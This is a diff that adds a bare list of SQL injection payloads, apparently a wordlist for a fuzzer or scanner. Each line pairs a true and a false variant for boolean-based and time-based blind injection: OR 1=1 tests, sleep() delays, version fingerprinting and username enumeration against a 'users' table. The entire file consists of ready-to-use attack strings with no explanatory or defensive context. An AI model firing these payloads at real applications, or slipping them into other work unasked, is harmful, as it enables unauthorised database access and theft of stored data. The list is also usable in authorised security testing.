@@ -1,0 +1,14 @@
+' AND 1=1 / ' AND 1=2
+' OR 1=1 / ' OR 1=2
+' AND 'a'='a / ' AND 'a'='b
+' OR 'a'='a / ' OR 'a'='b
+' AND 1=1 AND 'a'='a / ' AND 1=2 AND 'a'='a
+' AND (SELECT 'a' FROM users LIMIT 1) = 'a' / ' AND (SELECT 'a' FROM users LIMIT 1) = 'b'
+' and substring(version(),1,1)='5' / ' and substring(version(),1,1)='4'
+' RLIKE (SELECT (CASE WHEN (1=1) THEN 0x28 ELSE 0x29 END)) / ' RLIKE (SELECT (CASE WHEN (1=2) THEN 0x28 ELSE 0x29 END))
+' OR (SELECT*FROM(SELECT sleep(0))a) / ' OR (SELECT*FROM(SELECT sleep(5))a)
+' XOR (SELECT*FROM(SELECT sleep(0))a) / ' XOR (SELECT*FROM(SELECT sleep(5))a)
+' OR IF(MID(@@version,1,1)='5',sleep(0),1)='2 / ' OR IF(MID(@@version,1,1)='4',sleep(5),1)='2
+' AND ASCII(LOWER(SUBSTR(version(),1,1)))=51 / ' AND ASCII(LOWER(SUBSTR(version(),1,1)))=52
+' AND MAKE_SET(1<(SELECT(length(version()))),1) / ' AND MAKE_SET(1>(SELECT(length(version()))),1)
+' AND (SELECT username FROM users WHERE username REGEXP '^a[a-z]') / ' AND (SELECT username FROM users WHERE username REGEXP '^b[a-z]')
